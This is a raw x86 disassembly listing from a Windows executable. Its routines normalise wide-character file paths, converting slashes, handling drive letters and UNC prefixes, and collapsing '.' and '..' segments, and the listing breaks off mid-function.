  40962a:	mov    eax,DWORD PTR [esi+0x8]
  40962d:	push   DWORD PTR [eax]
  40962f:	lea    eax,[ebp-0x218]
  409635:	push   0x0
  409637:	push   eax
  409638:	call   DWORD PTR ds:0x42434c
  40963e:	test   eax,eax
  409640:	je     0x409693
  409642:	mov    ecx,DWORD PTR [esi+0xc]
  409645:	mov    ecx,DWORD PTR [ecx]
  409647:	mov    DWORD PTR [ecx],eax
  409649:	mov    eax,DWORD PTR [esi+0x10]
  40964c:	mov    eax,DWORD PTR [eax]
  40964e:	test   eax,eax
  409650:	je     0x40965b
  409652:	mov    ecx,DWORD PTR [ebp-0x21c]
  409658:	mov    WORD PTR [eax],cx
  40965b:	mov    eax,DWORD PTR [esi+0x14]
  40965e:	mov    ecx,DWORD PTR [eax]
  409660:	test   ecx,ecx
  409662:	je     0x40967a
  409664:	lea    eax,[ebp-0x218]
  40966a:	push   eax
  40966b:	mov    eax,DWORD PTR [esi+0x18]
  40966e:	push   DWORD PTR [eax]
  409670:	push   ecx
  409671:	call   DWORD PTR ds:0x4244b8
  409677:	add    esp,0xc
  40967a:	pop    ebx
  40967b:	mov    DWORD PTR [edi],0x0
  409681:	pop    edi
  409682:	pop    esi
  409683:	mov    ecx,DWORD PTR [ebp-0x4]
  409686:	xor    ecx,ebp
  409688:	call   0x40d492
  40968d:	mov    esp,ebp
  40968f:	pop    ebp
  409690:	ret    0xc
  409693:	cmp    DWORD PTR [edi],0x80070002
  409699:	jne    0x4096af
  40969b:	call   DWORD PTR ds:0x424344
  4096a1:	test   eax,eax
  4096a3:	jle    0x4096ad
  4096a5:	movzx  eax,ax
  4096a8:	or     eax,0x80070000
  4096ad:	mov    DWORD PTR [edi],eax
  4096af:	pop    ebx
  4096b0:	mov    ecx,DWORD PTR [ebp-0x4]
  4096b3:	pop    edi
  4096b4:	xor    ecx,ebp
  4096b6:	pop    esi
  4096b7:	call   0x40d492
  4096bc:	mov    esp,ebp
  4096be:	pop    ebp
  4096bf:	ret    0xc
  4096c2:	int3   
  4096c3:	int3   
  4096c4:	int3   
  4096c5:	int3   
  4096c6:	int3   
  4096c7:	int3   
  4096c8:	int3   
  4096c9:	int3   
  4096ca:	int3   
  4096cb:	int3   
  4096cc:	int3   
  4096cd:	int3   
  4096ce:	int3   
  4096cf:	int3   
  4096d0:	push   ebp
  4096d1:	mov    ebp,esp
  4096d3:	sub    esp,0x618
  4096d9:	mov    eax,ds:0x40e018
  4096de:	xor    eax,ebp
  4096e0:	mov    DWORD PTR [ebp-0x4],eax
  4096e3:	cmp    BYTE PTR ds:0x423230,0x0
  4096ea:	push   ebx
  4096eb:	push   esi
  4096ec:	mov    esi,ecx
  4096ee:	jne    0x4097a9
  4096f4:	push   0x0
  4096f6:	push   0x0
  4096f8:	push   0x100
  4096fd:	lea    eax,[ebp-0x210]
  409703:	push   eax
  409704:	push   0x100
  409709:	lea    eax,[ebp-0x410]
  40970f:	push   eax
  409710:	push   0x3
  409712:	lea    eax,[ebp-0xc]
  409715:	push   eax
  409716:	mov    eax,ds:0x4243a0
  40971b:	push   DWORD PTR [eax]
  40971d:	call   DWORD PTR ds:0x4243e8
  409723:	push   0x0
  409725:	push   0x0
  409727:	lea    eax,[ebp-0x410]
  40972d:	push   eax
  40972e:	lea    eax,[ebp-0xc]
  409731:	push   eax
  409732:	lea    eax,[ebp-0x618]
  409738:	push   0x104
  40973d:	push   eax
  40973e:	call   DWORD PTR ds:0x4243ec
  409744:	push   0xffffffff
  409746:	push   0x401afc
  40974b:	lea    eax,[ebp-0x210]
  409751:	push   0x100
  409756:	push   eax
  409757:	call   DWORD PTR ds:0x4243d8
  40975d:	add    esp,0x4c
  409760:	test   eax,eax
  409762:	je     0x409775
  409764:	xor    ebx,ebx
  409766:	mov    DWORD PTR ds:0x423234,ebx
  40976c:	mov    BYTE PTR ds:0x423230,0x1
  409773:	jmp    0x4097af
  409775:	sub    esp,0x18
  409778:	lea    edx,[ebp-0x210]
  40977e:	lea    ecx,[ebp-0x618]
  409784:	call   0x408fd0
  409789:	xor    ebx,ebx
  40978b:	add    esp,0x18
  40978e:	test   eax,eax
  409790:	sets   bl
  409793:	mov    BYTE PTR ds:0x423230,0x1
  40979a:	dec    ebx
  40979b:	and    ebx,DWORD PTR ds:0x423234
  4097a1:	mov    DWORD PTR ds:0x423234,ebx
  4097a7:	jmp    0x4097af
  4097a9:	mov    ebx,DWORD PTR ds:0x423234
  4097af:	movzx  eax,WORD PTR ds:0x423238
  4097b6:	push   eax
  4097b7:	mov    eax,esi
  4097b9:	shr    eax,0x4
  4097bc:	inc    eax
  4097bd:	movzx  eax,ax
  4097c0:	push   eax
  4097c1:	push   0x6
  4097c3:	push   ebx
  4097c4:	call   DWORD PTR ds:0x424328
  4097ca:	test   eax,eax
  4097cc:	je     0x409806
  4097ce:	push   eax
  4097cf:	push   ebx
  4097d0:	call   DWORD PTR ds:0x42432c
  4097d6:	mov    ecx,eax
  4097d8:	test   ecx,ecx
  4097da:	je     0x409806
  4097dc:	and    esi,0xf
  4097df:	je     0x4097ed
  4097e1:	movzx  eax,WORD PTR [ecx]
  4097e4:	lea    ecx,[ecx+eax*2]
  4097e7:	add    ecx,0x2
  4097ea:	dec    esi
  4097eb:	jne    0x4097e1
  4097ed:	cmp    WORD PTR [ecx],0x0
  4097f1:	je     0x409806
  4097f3:	lea    eax,[ecx+0x2]
  4097f6:	pop    esi
  4097f7:	pop    ebx
  4097f8:	mov    ecx,DWORD PTR [ebp-0x4]
  4097fb:	xor    ecx,ebp
  4097fd:	call   0x40d492
  409802:	mov    esp,ebp
  409804:	pop    ebp
  409805:	ret    
  409806:	mov    ecx,DWORD PTR [ebp-0x4]
  409809:	pop    esi
  40980a:	xor    ecx,ebp
  40980c:	xor    eax,eax
  40980e:	pop    ebx
  40980f:	call   0x40d492
  409814:	mov    esp,ebp
  409816:	pop    ebp
  409817:	ret    
  409818:	int3   
  409819:	int3   
  40981a:	int3   
  40981b:	int3   
  40981c:	int3   
  40981d:	int3   
  40981e:	int3   
  40981f:	int3   
  409820:	push   ebp
  409821:	mov    ebp,esp
  409823:	sub    esp,0x8
  409826:	mov    eax,ds:0x42323c
  40982b:	push   ebx
  40982c:	mov    ebx,DWORD PTR ds:0x40e8d4
  409832:	push   esi
  409833:	push   edi
  409834:	mov    DWORD PTR [ebp-0x8],ebx
  409837:	test   al,0x1
  409839:	jne    0x40988b
  40983b:	or     eax,0x1
  40983e:	push   0x40dd00
  409843:	mov    ds:0x42323c,eax
  409848:	mov    DWORD PTR ds:0x423248,0x0
  409852:	mov    DWORD PTR ds:0x423240,0x0
  40985c:	mov    DWORD PTR ds:0x423244,0x0
  409866:	mov    DWORD PTR ds:0x42324c,0x0
  409870:	mov    DWORD PTR ds:0x423250,0x0
  40987a:	mov    WORD PTR ds:0x423254,0x101
  409883:	call   0x40d582
  409888:	add    esp,0x4
  40988b:	mov    esi,ebx
  40988d:	lea    ecx,[esi+0x2]
  409890:	mov    ax,WORD PTR [esi]
  409893:	add    esi,0x2
  409896:	test   ax,ax
  409899:	jne    0x409890
  40989b:	sub    esi,ecx
  40989d:	sar    esi,1
  40989f:	mov    DWORD PTR [ebp-0x4],0x0
  4098a6:	lea    edi,[esi+0x1]
  4098a9:	mov    ecx,0x104
  4098ae:	cmp    edi,0x104
  4098b4:	jb     0x4098b8
  4098b6:	mov    ecx,edi
  4098b8:	mov    eax,ds:0x423240
  4098bd:	mov    ds:0x423244,eax
  4098c2:	lea    eax,[ebp-0x4]
  4098c5:	push   eax
  4098c6:	lea    eax,[ecx+ecx*1]
  4098c9:	push   eax
  4098ca:	mov    ecx,0x423240
  4098cf:	call   0x406f80
  4098d4:	test   eax,eax
  4098d6:	je     0x409b30
  4098dc:	push   ebx
  4098dd:	push   edi
  4098de:	mov    edi,DWORD PTR [ebp-0x4]
  4098e1:	push   edi
  4098e2:	call   DWORD PTR ds:0x4244b8
  4098e8:	mov    ebx,DWORD PTR ds:0x4243f4
  4098ee:	add    esp,0xc
  4098f1:	push   0x2f
  4098f3:	push   edi
  4098f4:	call   ebx
  4098f6:	add    esp,0x8
  4098f9:	test   eax,eax
  4098fb:	je     0x409917
  4098fd:	mov    edi,0x5c
  409902:	mov    WORD PTR [eax],di
  409905:	add    eax,0x2
  409908:	push   0x2f
  40990a:	push   eax
  40990b:	call   ebx
  40990d:	add    esp,0x8
  409910:	test   eax,eax
  409912:	jne    0x409902
  409914:	mov    edi,DWORD PTR [ebp-0x4]
  409917:	movzx  eax,WORD PTR [edi]
  40991a:	test   ax,ax
  40991d:	je     0x409b27
  409923:	cmp    eax,0x5c
  409926:	je     0x409b27
  40992c:	cmp    eax,0x3c
  40992f:	je     0x409b27
  409935:	push   eax
  409936:	call   DWORD PTR ds:0x4243f0
  40993c:	add    esp,0x4
  40993f:	test   eax,eax
  409941:	je     0x4099c8
  409947:	cmp    WORD PTR [edi+0x2],0x3a
  40994c:	jne    0x4099c8
  40994e:	mov    ax,WORD PTR [edi]
  409951:	cmp    ax,WORD PTR ds:0x40e8e0
  409958:	jne    0x409b27
  40995e:	mov    eax,0x5c
  409963:	cmp    ax,WORD PTR [edi+0x4]
  409967:	je     0x409b27
  40996d:	mov    edx,0x40e8e0
  409972:	lea    edi,[edx+0x2]
  409975:	mov    ax,WORD PTR [edx]
  409978:	add    edx,0x2
  40997b:	test   ax,ax
  40997e:	jne    0x409975
  409980:	sub    edx,edi
  409982:	sar    edx,1
  409984:	push   0x104
  409989:	lea    ebx,[edx+esi*1]
  40998c:	mov    edx,ebx
  40998e:	mov    ecx,0x423240
  409993:	mov    DWORD PTR [ebp-0x4],ebx
  409996:	call   0x406bd0
  40999b:	add    esp,0x4
  40999e:	mov    edi,eax
  4099a0:	mov    eax,ds:0x4244b8
  4099a5:	push   0x40e8e0
  4099aa:	push   ebx
  4099ab:	push   edi
  4099ac:	call   eax
  4099ae:	mov    esi,DWORD PTR ds:0x4244b4
  4099b4:	add    esp,0xc
  4099b7:	push   0x401bac
  4099bc:	push   ebx
  4099bd:	push   edi
  4099be:	call   esi
  4099c0:	mov    eax,DWORD PTR [ebp-0x8]
  4099c3:	add    eax,0x4
  4099c6:	jmp    0x409a20
  4099c8:	mov    ecx,0x40e8e0
  4099cd:	lea    edx,[ecx+0x2]
  4099d0:	mov    ax,WORD PTR [ecx]
  4099d3:	add    ecx,0x2
  4099d6:	test   ax,ax
  4099d9:	jne    0x4099d0
  4099db:	sub    ecx,edx
  4099dd:	sar    ecx,1
  4099df:	lea    ebx,[esi+0x2]
  4099e2:	add    ebx,ecx
  4099e4:	push   0x104
  4099e9:	mov    edx,ebx
  4099eb:	mov    ecx,0x423240
  4099f0:	mov    DWORD PTR [ebp-0x4],ebx
  4099f3:	call   0x406bd0
  4099f8:	add    esp,0x4
  4099fb:	mov    edi,eax
  4099fd:	mov    eax,ds:0x4244b8
  409a02:	push   0x40e8e0
  409a07:	push   ebx
  409a08:	push   edi
  409a09:	call   eax
  409a0b:	mov    esi,DWORD PTR ds:0x4244b4
  409a11:	add    esp,0xc
  409a14:	push   0x401bac
  409a19:	push   ebx
  409a1a:	push   edi
  409a1b:	call   esi
  409a1d:	mov    eax,DWORD PTR [ebp-0x8]
  409a20:	add    esp,0xc
  409a23:	push   eax
  409a24:	push   ebx
  409a25:	push   edi
  409a26:	call   esi
  409a28:	add    esp,0xc
  409a2b:	mov    ecx,edi
  409a2d:	call   0x40a2b0
  409a32:	push   0x5c
  409a34:	push   edi
  409a35:	call   DWORD PTR ds:0x4243f4
  409a3b:	mov    esi,eax
  409a3d:	add    esp,0x8
  409a40:	test   esi,esi
  409a42:	je     0x409b19
  409a48:	jmp    0x409a50
  409a4a:	lea    ebx,[ebx+0x0]
  409a50:	movzx  eax,WORD PTR [esi+0x2]
  409a54:	lea    ecx,[esi+0x2]
  409a57:	mov    DWORD PTR [ebp-0x8],ecx
  409a5a:	test   eax,eax
  409a5c:	je     0x409b14
  409a62:	cmp    eax,0x2e
  409a65:	je     0x409a6f
  409a67:	cmp    eax,0x5c
  409a6a:	jne    0x409ad3
  409a6c:	push   ecx
  409a6d:	jmp    0x409adb
  409a6f:	movzx  eax,WORD PTR [esi+0x4]
  409a73:	lea    edx,[esi+0x4]
  409a76:	cmp    eax,0x5c
  409a79:	je     0x409ada
  409a7b:	test   ax,ax
  409a7e:	je     0x409ada
  409a80:	cmp    eax,0x2e
  409a83:	jne    0x409ad3
  409a85:	movzx  eax,WORD PTR [esi+0x6]
  409a89:	cmp    eax,0x5c
  409a8c:	je     0x409a93
  409a8e:	test   ax,ax
  409a91:	jne    0x409ad3
  409a93:	xor    eax,eax
  409a95:	push   0x5c
  409a97:	push   edi
  409a98:	mov    WORD PTR [esi],ax
  409a9b:	call   DWORD PTR ds:0x4243f8
  409aa1:	mov    ebx,eax
  409aa3:	add    esp,0x8
  409aa6:	mov    eax,0x5c
  409aab:	mov    WORD PTR [esi],ax
  409aae:	test   ebx,ebx
  409ab0:	je     0x409ad0
  409ab2:	lea    eax,[esi+0x6]
  409ab5:	push   eax
  409ab6:	mov    eax,DWORD PTR [ebp-0x4]
  409ab9:	mov    ecx,ebx
  409abb:	sub    ecx,edi
  409abd:	sar    ecx,1
  409abf:	sub    eax,ecx
  409ac1:	push   eax
  409ac2:	push   ebx
  409ac3:	call   DWORD PTR ds:0x4244b8
  409ac9:	mov    esi,ebx
  409acb:	mov    ebx,DWORD PTR [ebp-0x4]
  409ace:	jmp    0x409aed
  409ad0:	mov    ecx,DWORD PTR [ebp-0x8]
  409ad3:	mov    ebx,DWORD PTR [ebp-0x4]
  409ad6:	mov    esi,ecx
  409ad8:	jmp    0x409af0
  409ada:	push   edx
  409adb:	mov    ecx,esi
  409add:	sub    ecx,edi
  409adf:	sar    ecx,1
  409ae1:	mov    eax,ebx
  409ae3:	sub    eax,ecx
  409ae5:	push   eax
  409ae6:	push   esi
  409ae7:	call   DWORD PTR ds:0x4244b8
  409aed:	add    esp,0xc
  409af0:	push   0x5c
  409af2:	push   esi
  409af3:	call   DWORD PTR ds:0x4243f4
  409af9:	mov    esi,eax
  409afb:	add    esp,0x8
  409afe:	test   esi,esi
  409b00:	jne    0x409a50
  409b06:	mov    ecx,edi
  409b08:	call   0x409b50
  409b0d:	pop    edi
  409b0e:	pop    esi
  409b0f:	pop    ebx
  409b10:	mov    esp,ebp
  409b12:	pop    ebp
  409b13:	ret    
  409b14:	xor    eax,eax
  409b16:	mov    WORD PTR [esi],ax
  409b19:	mov    ecx,edi
  409b1b:	call   0x409b50
  409b20:	pop    edi
  409b21:	pop    esi
  409b22:	pop    ebx
  409b23:	mov    esp,ebp
  409b25:	pop    ebp
  409b26:	ret    
  409b27:	mov    eax,edi
  409b29:	pop    edi
  409b2a:	pop    esi
  409b2b:	pop    ebx
  409b2c:	mov    esp,ebp
  409b2e:	pop    ebp
  409b2f:	ret    
  409b30:	push   0x0
  409b32:	mov    edx,0x4010c0
  409b37:	mov    ecx,0x5e5
  409b3c:	call   0x407010
  409b41:	int3   
  409b42:	int3   
  409b43:	int3   
  409b44:	int3   
  409b45:	int3   
  409b46:	int3   
  409b47:	int3   
  409b48:	int3   
  409b49:	int3   
  409b4a:	int3   
  409b4b:	int3   
  409b4c:	int3   
  409b4d:	int3   
  409b4e:	int3   
  409b4f:	int3   
  409b50:	push   ebp
  409b51:	mov    ebp,esp
  409b53:	sub    esp,0xc
  409b56:	push   ebx
  409b57:	push   esi
  409b58:	push   edi
  409b59:	mov    edi,ecx
  409b5b:	push   0x5c
  409b5d:	push   0x40e438
  409b62:	mov    DWORD PTR [ebp-0x8],edi
  409b65:	call   DWORD PTR ds:0x4243f8
  409b6b:	add    esp,0x8
  409b6e:	test   eax,eax
  409b70:	je     0x409b7e
  409b72:	cmp    WORD PTR [eax+0x2],0x0
  409b77:	jne    0x409b7e
  409b79:	xor    ecx,ecx
  409b7b:	mov    WORD PTR [eax],cx
  409b7e:	xor    ecx,ecx
  409b80:	xor    ebx,ebx
  409b82:	mov    DWORD PTR [ebp-0x4],ecx
  409b85:	cmp    WORD PTR [edi],cx
  409b88:	je     0x409db0
  409b8e:	xor    eax,eax
  409b90:	movzx  ecx,WORD PTR [eax+0x40e438]
  409b97:	test   cx,cx
  409b9a:	je     0x409c25
  409ba0:	movzx  esi,WORD PTR [eax+edi*1]
  409ba4:	mov    edi,ecx
  409ba6:	cmp    si,di
  409ba9:	jne    0x409bb8
  409bab:	cmp    esi,0x5c
  409bae:	jne    0x409c0e
  409bb0:	lea    edx,[ebx+0x1]
  409bb3:	mov    DWORD PTR [ebp-0x4],edx
  409bb6:	jmp    0x409c0e
  409bb8:	push   esi
  409bb9:	call   DWORD PTR ds:0x4243fc
  409bbf:	add    esp,0x4
  409bc2:	test   eax,eax
  409bc4:	je     0x409be3
  409bc6:	push   edi
  409bc7:	call   DWORD PTR ds:0x424400
  409bcd:	add    esp,0x4
  409bd0:	test   eax,eax
  409bd2:	je     0x409be3
  409bd4:	push   esi
  409bd5:	call   DWORD PTR ds:0x424404
  409bdb:	add    esp,0x4
  409bde:	cmp    ax,di
  409be1:	je     0x409c0e
  409be3:	push   edi
  409be4:	call   DWORD PTR ds:0x4243fc
  409bea:	add    esp,0x4
  409bed:	test   eax,eax
  409bef:	je     0x409c22
  409bf1:	push   esi
  409bf2:	call   DWORD PTR ds:0x424400
  409bf8:	add    esp,0x4
  409bfb:	test   eax,eax
  409bfd:	je     0x409c22
  409bff:	push   edi
  409c00:	call   DWORD PTR ds:0x424404
  409c06:	add    esp,0x4
  409c09:	cmp    ax,si
  409c0c:	jne    0x409c22
  409c0e:	mov    edi,DWORD PTR [ebp-0x8]
  409c11:	inc    ebx
  409c12:	lea    eax,[ebx+ebx*1]
  409c15:	cmp    WORD PTR [eax+edi*1],0x0
  409c1a:	jne    0x409b90
  409c20:	jmp    0x409c25
  409c22:	mov    edi,DWORD PTR [ebp-0x8]
  409c25:	test   ebx,ebx
  409c27:	je     0x409db0
  409c2d:	cmp    WORD PTR [ebx*2+0x40e438],0x0
  409c36:	jne    0x409c47
  409c38:	cmp    WORD PTR [edi+ebx*2],0x5c
  409c3d:	jne    0x409c47
  409c3f:	inc    ebx
  409c40:	mov    DWORD PTR [ebp-0x4],ebx
  409c43:	xor    esi,esi
  409c45:	jmp    0x409c7b
  409c47:	mov    ecx,DWORD PTR [ebp-0x4]
  409c4a:	mov    ebx,DWORD PTR ds:0x4243f4
  409c50:	lea    eax,[ecx*2+0x40e438]
  409c57:	push   0x5c
  409c59:	push   eax
  409c5a:	mov    esi,0x1
  409c5f:	call   ebx
  409c61:	add    esp,0x8
  409c64:	test   eax,eax
  409c66:	je     0x409c78
  409c68:	add    eax,0x2
  409c6b:	push   0x5c
  409c6d:	push   eax
  409c6e:	inc    esi
  409c6f:	call   ebx
  409c71:	add    esp,0x8
  409c74:	test   eax,eax
  409c76:	jne    0x409c68
  409c78:	mov    ebx,DWORD PTR [ebp-0x4]
  409c7b:	mov    eax,ds:0x423258
  409c80:	test   al,0x1
  409c82:	jne    0x409cd4
  409c84:	or     eax,0x1
  409c87:	push   0x40dd40
  409c8c:	mov    ds:0x423258,eax
  409c91:	mov    DWORD PTR ds:0x423264,0x0
  409c9b:	mov    DWORD PTR ds:0x42325c,0x0
  409ca5:	mov    DWORD PTR ds:0x423260,0x0
  409caf:	mov    DWORD PTR ds:0x423268,0x0
  409cb9:	mov    DWORD PTR ds:0x42326c,0x0
  409cc3:	mov    WORD PTR ds:0x423270,0x101
  409ccc:	call   0x40d582
  409cd1:	add    esp,0x4
  409cd4:	mov    ecx,edi
  409cd6:	lea    edx,[ecx+0x2]
  409cd9:	lea    esp,[esp+0x0]
  409ce0:	mov    ax,WORD PTR [ecx]
  409ce3:	add    ecx,0x2
  409ce6:	test   ax,ax
  409ce9:	jne    0x409ce0
  409ceb:	movzx  eax,si
  409cee:	sub    ecx,edx
  409cf0:	mov    DWORD PTR [ebp-0xc],eax
  409cf3:	sar    ecx,1
  409cf5:	lea    eax,[eax+eax*2]
  409cf8:	sub    eax,ebx
  409cfa:	lea    ebx,[ecx+0x1]
  409cfd:	add    ebx,eax
  409cff:	mov    esi,0x104
  409d04:	cmp    ebx,0x104
  409d0a:	jb     0x409d0e
  409d0c:	mov    esi,ebx
  409d0e:	add    esi,esi
  409d10:	mov    edi,DWORD PTR ds:0x42325c
  409d16:	mov    DWORD PTR ds:0x423260,edi
  409d1c:	js     0x409d26
  409d1e:	cmp    esi,DWORD PTR ds:0x423264
  409d24:	jle    0x409d3f
  409d26:	push   esi
  409d27:	mov    ecx,0x42325c
  409d2c:	call   0x406ea0
  409d31:	test   eax,eax
  409d33:	je     0x409db9
  409d39:	mov    edi,DWORD PTR ds:0x423260
  409d3f:	push   esi
  409d40:	push   0x0
  409d42:	push   edi
  409d43:	call   0x40db72
  409d48:	mov    eax,ds:0x423260
  409d4d:	add    esp,0xc
  409d50:	add    eax,esi
  409d52:	cmp    DWORD PTR ds:0x42325c,0x0
  409d59:	jne    0x409d71
  409d5b:	mov    DWORD PTR ds:0x423260,0x0
  409d65:	mov    DWORD PTR ds:0x42325c,0x0
  409d6f:	jmp    0x409d76
  409d71:	mov    ds:0x423260,eax
  409d76:	xor    eax,eax
  409d78:	xor    esi,esi
  409d7a:	mov    WORD PTR [edi],ax
  409d7d:	cmp    DWORD PTR [ebp-0xc],eax
  409d80:	jle    0x409d9b
  409d82:	push   0x401bb0
  409d87:	push   ebx
  409d88:	push   edi
  409d89:	call   DWORD PTR ds:0x4244b4
  409d8f:	inc    esi
  409d90:	movzx  eax,si
  409d93:	add    esp,0xc
  409d96:	cmp    eax,DWORD PTR [ebp-0xc]
  409d99:	jl     0x409d82
  409d9b:	mov    eax,DWORD PTR [ebp-0x8]
  409d9e:	mov    ecx,DWORD PTR [ebp-0x4]
  409da1:	lea    ecx,[eax+ecx*2]
  409da4:	push   ecx
  409da5:	push   ebx
  409da6:	push   edi
  409da7:	call   DWORD PTR ds:0x4244b4
  409dad:	add    esp,0xc
  409db0:	mov    eax,edi
  409db2:	pop    edi
  409db3:	pop    esi
  409db4:	pop    ebx
  409db5:	mov    esp,ebp
  409db7:	pop    ebp
  409db8:	ret    
  409db9:	push   0x0
  409dbb:	mov    edx,0x4010c0
  409dc0:	mov    ecx,0x5e5
  409dc5:	call   0x407010
  409dca:	int3   
  409dcb:	int3   
  409dcc:	int3   
  409dcd:	int3   
  409dce:	int3   
  409dcf:	int3   
  409dd0:	push   ebp
  409dd1:	mov    ebp,esp
  409dd3:	push   ecx
  409dd4:	push   esi
  409dd5:	push   edi
  409dd6:	mov    edi,DWORD PTR [ebp+0x8]
  409dd9:	mov    esi,ecx
  409ddb:	xor    eax,eax
  409ddd:	mov    WORD PTR [esi],ax
  409de0:	cmp    WORD PTR [edi],0x5c
  409de4:	mov    DWORD PTR [ebp-0x4],edx
  409de7:	jne    0x409e67
  409de9:	cmp    WORD PTR [edi+0x2],0x5c
  409dee:	jne    0x409e67
  409df0:	push   ebx
  409df1:	mov    ebx,DWORD PTR ds:0x4243f4
  409df7:	lea    eax,[edi+0x4]
  409dfa:	push   0x5c
  409dfc:	push   eax
  409dfd:	call   ebx
  409dff:	add    esp,0x8
  409e02:	test   eax,eax
  409e04:	je     0x409e57
  409e06:	add    eax,0x2
  409e09:	push   0x5c
  409e0b:	push   eax
  409e0c:	call   ebx
  409e0e:	mov    ebx,eax
  409e10:	add    esp,0x8
  409e13:	test   ebx,ebx
  409e15:	jne    0x409e32
  409e17:	mov    ecx,edi
  409e19:	lea    edx,[ecx+0x2]
  409e1c:	lea    esp,[esp+0x0]
  409e20:	mov    ax,WORD PTR [ecx]
  409e23:	add    ecx,0x2
  409e26:	test   ax,ax
  409e29:	jne    0x409e20
  409e2b:	sub    ecx,edx
  409e2d:	sar    ecx,1
  409e2f:	lea    ebx,[edi+ecx*2]
  409e32:	mov    eax,DWORD PTR [ebp-0x4]
  409e35:	sub    ebx,edi
  409e37:	sar    ebx,1
  409e39:	push   ebx
  409e3a:	push   edi
  409e3b:	add    eax,eax
  409e3d:	push   eax
  409e3e:	push   esi
  409e3f:	call   DWORD PTR ds:0x4243a4
  409e45:	add    esp,0x10
  409e48:	xor    eax,eax
  409e4a:	mov    WORD PTR [esi+ebx*2],ax
  409e4e:	pop    ebx
  409e4f:	pop    edi
  409e50:	mov    eax,esi
  409e52:	pop    esi
  409e53:	mov    esp,ebp
  409e55:	pop    ebp
  409e56:	ret    
  409e57:	mov    eax,DWORD PTR [ebp-0x4]
  409e5a:	push   edi
  409e5b:	push   eax
  409e5c:	push   esi
  409e5d:	call   DWORD PTR ds:0x4244b8
  409e63:	add    esp,0xc
  409e66:	pop    ebx
  409e67:	pop    edi
  409e68:	mov    eax,esi
  409e6a:	pop    esi
  409e6b:	mov    esp,ebp
  409e6d:	pop    ebp
  409e6e:	ret    
  409e6f:	int3   
  409e70:	push   ebp
  409e71:	mov    ebp,esp
  409e73:	sub    esp,0xc2c
  409e79:	mov    eax,ds:0x40e018
  409e7e:	xor    eax,ebp
  409e80:	mov    DWORD PTR [ebp-0x4],eax
  409e83:	mov    eax,ds:0x423274
  409e88:	push   ebx
  409e89:	push   esi
  409e8a:	mov    esi,ecx
  409e8c:	push   edi
  409e8d:	mov    DWORD PTR [ebp-0xc28],edx
  409e93:	mov    DWORD PTR [ebp-0xc20],esi
  409e99:	test   al,0x1
  409e9b:	jne    0x409ef3
  409e9d:	or     eax,0x1
  409ea0:	push   0x40dd80
  409ea5:	mov    ds:0x423274,eax
  409eaa:	mov    DWORD PTR ds:0x423280,0x0
  409eb4:	mov    DWORD PTR ds:0x423278,0x0
  409ebe:	mov    DWORD PTR ds:0x42327c,0x0
  409ec8:	mov    DWORD PTR ds:0x423284,0x0
  409ed2:	mov    DWORD PTR ds:0x423288,0x0
  409edc:	mov    WORD PTR ds:0x42328c,0x101
  409ee5:	call   0x40d582
  409eea:	mov    edx,DWORD PTR [ebp-0xc28]
  409ef0:	add    esp,0x4
  409ef3:	mov    ecx,esi
  409ef5:	lea    edi,[ecx+0x2]
  409ef8:	jmp    0x409f00
  409efa:	lea    ebx,[ebx+0x0]
  409f00:	mov    ax,WORD PTR [ecx]
  409f03:	add    ecx,0x2
  409f06:	test   ax,ax
  409f09:	jne    0x409f00
  409f0b:	sub    ecx,edi
  409f0d:	sar    ecx,1
  409f0f:	lea    edi,[edx+0x2]
  409f12:	mov    ax,WORD PTR [edx]
  409f15:	add    edx,0x2
  409f18:	test   ax,ax
  409f1b:	jne    0x409f12
  409f1d:	sub    edx,edi
  409f1f:	sar    edx,1
  409f21:	lea    ebx,[ecx+0x2]
  409f24:	add    ebx,edx
  409f26:	mov    DWORD PTR [ebp-0xc24],0x0
  409f30:	mov    ecx,0x400
  409f35:	cmp    ebx,0x400
  409f3b:	jb     0x409f3f
  409f3d:	mov    ecx,ebx
  409f3f:	mov    eax,ds:0x423278
  409f44:	mov    ds:0x42327c,eax
  409f49:	lea    eax,[ebp-0xc24]
  409f4f:	push   eax
  409f50:	lea    eax,[ecx+ecx*1]
  409f53:	push   eax
  409f54:	mov    ecx,0x423278
  409f59:	call   0x406f80
  409f5e:	test   eax,eax
  409f60:	je     0x40a295
  409f66:	mov    edi,DWORD PTR [ebp-0xc24]
  409f6c:	push   esi
  409f6d:	mov    esi,DWORD PTR ds:0x4244b8
  409f73:	push   ebx
  409f74:	push   edi
  409f75:	call   esi
  409f77:	add    esp,0xc
  409f7a:	push   0x2f
  409f7c:	push   edi
  409f7d:	call   DWORD PTR ds:0x4243f4
  409f83:	add    esp,0x8
  409f86:	test   eax,eax
  409f88:	je     0x409fac
  409f8a:	mov    edi,0x5c
  409f8f:	nop
  409f90:	mov    WORD PTR [eax],di
  409f93:	add    eax,0x2
  409f96:	push   0x2f
  409f98:	push   eax
  409f99:	call   DWORD PTR ds:0x4243f4
  409f9f:	add    esp,0x8
  409fa2:	test   eax,eax
  409fa4:	jne    0x409f90
  409fa6:	mov    edi,DWORD PTR [ebp-0xc24]
  409fac:	movzx  eax,WORD PTR [edi]
  409faf:	cmp    eax,0x3c
  409fb2:	je     0x40a282
  409fb8:	test   ax,ax
  409fbb:	jne    0x409fe5
  409fbd:	mov    ecx,DWORD PTR [ebp-0xc28]
  409fc3:	push   ecx
  409fc4:	push   ebx
  409fc5:	push   edi
  409fc6:	call   esi
  409fc8:	add    esp,0xc
  409fcb:	mov    ecx,edi
  409fcd:	call   0x40a2b0
  409fd2:	mov    eax,edi
  409fd4:	pop    edi
  409fd5:	pop    esi
  409fd6:	pop    ebx
  409fd7:	mov    ecx,DWORD PTR [ebp-0x4]
  409fda:	xor    ecx,ebp
  409fdc:	call   0x40d492
  409fe1:	mov    esp,ebp
  409fe3:	pop    ebp
  409fe4:	ret    
  409fe5:	cmp    eax,0x5c
  409fe8:	jne    0x409ff4
  409fea:	cmp    WORD PTR [edi+0x2],ax
  409fee:	jne    0x409ff4
  409ff0:	mov    cl,0x1
  409ff2:	jmp    0x409ff6
  409ff4:	xor    cl,cl
  409ff6:	mov    BYTE PTR [ebp-0xc19],cl
  409ffc:	cmp    eax,0x5c
  409fff:	jne    0x40a00c
  40a001:	mov    BYTE PTR [ebp-0xc1a],0x1
  40a008:	test   cl,cl
  40a00a:	je     0x40a013
  40a00c:	mov    BYTE PTR [ebp-0xc1a],0x0
  40a013:	push   DWORD PTR [ebp-0xc28]
  40a019:	lea    eax,[ebp-0x808]
  40a01f:	push   0x400
  40a024:	push   eax
  40a025:	call   esi
  40a027:	add    esp,0xc
  40a02a:	lea    ecx,[ebp-0x808]
  40a030:	call   0x40a2b0
  40a035:	cmp    WORD PTR [ebp-0x808],0x5c
